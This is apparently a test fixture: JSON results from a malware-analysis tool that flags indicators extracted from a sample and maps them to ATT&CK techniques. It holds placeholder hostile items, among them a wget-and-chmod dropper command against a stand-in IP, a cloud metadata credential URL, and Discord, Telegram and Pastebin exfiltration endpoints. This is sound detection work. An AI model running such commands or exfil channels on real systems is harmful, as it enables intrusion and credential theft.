@@ -1,0 +1,951 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 4950,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "address": "1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+            "coin": "BTC"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "coin",
+            "address"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1583"
+          ],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+              ]
+            }
+          }
+        },
+        "title_text": "Cryptocurrency Wallets",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "connection": "stratum+tcp://placeholder-pool.example:3333"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "connection"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1496"
+          ],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 750,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "stratum+tcp://placeholder-pool.example:3333"
+              ]
+            }
+          }
+        },
+        "title_text": "Mining Pool Connections",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "type": "generic_password_kv",
+            "value": "Tr0ub4dor&3xyz"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "type",
+            "value"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1552"
+          ],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {},
+          "signatures": {
+            "generic_password_kv": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "Tr0ub4dor&3xyz"
+              ]
+            }
+          }
+        },
+        "title_text": "Credential Patterns",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ip": "8.8.8.8",
+            "port": "4444",
+            "suspicious": "yes"
+          },
+          {
+            "ip": "2001:4860:4860::8888",
+            "port": "3333",
+            "suspicious": "yes"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ip",
+            "port",
+            "suspicious"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1071"
+          ],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 300,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "port": [
+              "4444",
+              "3333"
+            ],
+            "static": {
+              "ip": [
+                "8.8.8.8",
+                "2001:4860:4860::8888"
+              ]
+            }
+          }
+        },
+        "title_text": "IP Addresses",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "address": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "address"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1090"
+          ],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion"
+              ]
+            }
+          }
+        },
+        "title_text": "Onion Addresses",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "command": "wget http://198.51.100.5/x -O /tmp/x && chmod +x"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1105"
+          ],
+          "frequency": 1,
+          "heur_id": 6,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "wget http://198.51.100.5/x -O /tmp/x && chmod +x"
+              ]
+            }
+          }
+        },
+        "title_text": "Shell Dropper Commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "url"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1552.005"
+          ],
+          "frequency": 1,
+          "heur_id": 7,
+          "score": 600,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+              ]
+            }
+          }
+        },
+        "title_text": "Cloud Metadata API Access",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "path": "C:\\Users\\placeholder_dev\\proj\\obj\\Release\\sample.pdb",
+            "username": "placeholder_dev"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "path",
+            "username"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 8,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "pe": {
+              "pdb_filename": [
+                "C:\\Users\\placeholder_dev\\proj\\obj\\Release\\sample.pdb"
+              ]
+            }
+          }
+        },
+        "title_text": "PDB Debug Paths",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "api": "CreateRemoteThread",
+            "category": "process_injection"
+          },
+          {
+            "api": "VirtualAllocEx",
+            "category": "process_injection"
+          },
+          {
+            "api": "WriteProcessMemory",
+            "category": "process_injection"
+          },
+          {
+            "api": "CheckRemoteDebuggerPresent",
+            "category": "anti_debug_anti_vm"
+          },
+          {
+            "api": "IsDebuggerPresent",
+            "category": "anti_debug_anti_vm"
+          },
+          {
+            "api": "GetProcAddress",
+            "category": "dynamic_resolution"
+          },
+          {
+            "api": "LoadLibraryA",
+            "category": "dynamic_resolution"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "category",
+            "api"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1055",
+            "T1497"
+          ],
+          "frequency": 1,
+          "heur_id": 9,
+          "score": 450,
+          "score_map": {},
+          "signatures": {
+            "anti_debug_anti_vm": 1,
+            "dynamic_resolution": 1,
+            "process_injection": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "pe": {
+              "api_vector": [
+                "CreateRemoteThread",
+                "VirtualAllocEx",
+                "WriteProcessMemory",
+                "CheckRemoteDebuggerPresent",
+                "IsDebuggerPresent",
+                "GetProcAddress",
+                "LoadLibraryA"
+              ]
+            }
+          }
+        },
+        "title_text": "Suspicious Win32 API Usage",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "artifact": "VBox"
+          },
+          {
+            "artifact": "SbieDll.dll"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "artifact"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1497"
+          ],
+          "frequency": 1,
+          "heur_id": 10,
+          "score": 150,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "VBox",
+                "SbieDll.dll"
+              ]
+            }
+          }
+        },
+        "title_text": "Anti-VM / Anti-Sandbox Artifacts",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "type": "discord_webhook",
+            "value": "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+          },
+          {
+            "type": "telegram_bot",
+            "value": "https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+          },
+          {
+            "type": "pastebin_raw",
+            "value": "https://pastebin.com/raw/AbCdEf12"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "type",
+            "value"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1102",
+            "T1567"
+          ],
+          "frequency": 1,
+          "heur_id": 11,
+          "score": 500,
+          "score_map": {},
+          "signatures": {
+            "discord_webhook": 1,
+            "pastebin_raw": 1,
+            "telegram_bot": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "uri": [
+                "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+                "https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+                "https://pastebin.com/raw/AbCdEf12"
+              ]
+            }
+          }
+        },
+        "title_text": "Modern C2/Exfil Channels",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "phrase": "Your files have been encrypted"
+          },
+          {
+            "phrase": "decryption key"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "phrase"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1486"
+          ],
+          "frequency": 1,
+          "heur_id": 12,
+          "score": 500,
+          "score_map": {},
+          "signatures": {
+            "ransom_with_payment_evidence": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "Your files have been encrypted",
+                "decryption key"
+              ]
+            }
+          }
+        },
+        "title_text": "Ransom Note Language",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "address": "person@example.com"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "address"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "email": {
+              "address": [
+                "person@example.com"
+              ]
+            }
+          }
+        },
+        "title_text": "Email Addresses",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "path": "/dev/shm/payload"
+          },
+          {
+            "path": "\\AppData\\Local\\Temp\\payload.exe"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "path"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "/dev/shm/payload",
+                "\\AppData\\Local\\Temp\\payload.exe"
+              ]
+            }
+          }
+        },
+        "title_text": "Suspicious Staging/Drop Paths",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "user_agent": "PlaceholderBot/1.0"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "user_agent"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "user_agent": [
+              "PlaceholderBot/1.0"
+            ]
+          }
+        },
+        "title_text": "User-Agent Strings",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [
+          "T1583"
+        ],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1496"
+        ],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1552"
+        ],
+        "heur_id": 3,
+        "signatures": [
+          "generic_password_kv"
+        ]
+      },
+      {
+        "attack_ids": [
+          "T1071"
+        ],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1090"
+        ],
+        "heur_id": 5,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1105"
+        ],
+        "heur_id": 6,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1552.005"
+        ],
+        "heur_id": 7,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 8,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1055",
+          "T1497"
+        ],
+        "heur_id": 9,
+        "signatures": [
+          "process_injection",
+          "anti_debug_anti_vm",
+          "dynamic_resolution"
+        ]
+      },
+      {
+        "attack_ids": [
+          "T1497"
+        ],
+        "heur_id": 10,
+        "signatures": []
+      },
+      {
+        "attack_ids": [
+          "T1102",
+          "T1567"
+        ],
+        "heur_id": 11,
+        "signatures": [
+          "discord_webhook",
+          "telegram_bot",
+          "pastebin_raw"
+        ]
+      },
+      {
+        "attack_ids": [
+          "T1486"
+        ],
+        "heur_id": 12,
+        "signatures": [
+          "ransom_with_payment_evidence"
+        ]
+      }
+    ],
+    "tags": {
+      "file.pe.api_vector": [
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "CheckRemoteDebuggerPresent"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "CreateRemoteThread"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "GetProcAddress"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "IsDebuggerPresent"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "LoadLibraryA"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "VirtualAllocEx"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [
+            "process_injection",
+            "anti_debug_anti_vm",
+            "dynamic_resolution"
+          ],
+          "value": "WriteProcessMemory"
+        }
+      ],
+      "file.pe.pdb_filename": [
+        {
+          "heur_id": 8,
+          "signatures": [],
+          "value": "C:\\Users\\placeholder_dev\\proj\\obj\\Release\\sample.pdb"
+        }
+      ],
+      "file.string.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "/dev/shm/payload"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [],
+          "value": "SbieDll.dll"
+        },
+        {
+          "heur_id": 3,
+          "signatures": [
+            "generic_password_kv"
+          ],
+          "value": "Tr0ub4dor&3xyz"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [],
+          "value": "VBox"
+        },
+        {
+          "heur_id": 12,
+          "signatures": [
+            "ransom_with_payment_evidence"
+          ],
+          "value": "Your files have been encrypted"
+        },
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "\\AppData\\Local\\Temp\\payload.exe"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion"
+        },
+        {
+          "heur_id": 12,
+          "signatures": [
+            "ransom_with_payment_evidence"
+          ],
+          "value": "decryption key"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "stratum+tcp://placeholder-pool.example:3333"
+        },
+        {
+          "heur_id": 6,
+          "signatures": [],
+          "value": "wget http://198.51.100.5/x -O /tmp/x && chmod +x"
+        }
+      ],
+      "network.email.address": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "person@example.com"
+        }
+      ],
+      "network.port": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "3333"
+        },
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "4444"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "2001:4860:4860::8888"
+        },
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "8.8.8.8"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 11,
+          "signatures": [
+            "discord_webhook",
+            "telegram_bot",
+            "pastebin_raw"
+          ],
+          "value": "https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        },
+        {
+          "heur_id": 11,
+          "signatures": [
+            "discord_webhook",
+            "telegram_bot",
+            "pastebin_raw"
+          ],
+          "value": "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        },
+        {
+          "heur_id": 11,
+          "signatures": [
+            "discord_webhook",
+            "telegram_bot",
+            "pastebin_raw"
+          ],
+          "value": "https://pastebin.com/raw/AbCdEf12"
+        }
+      ],
+      "network.user_agent": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "PlaceholderBot/1.0"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
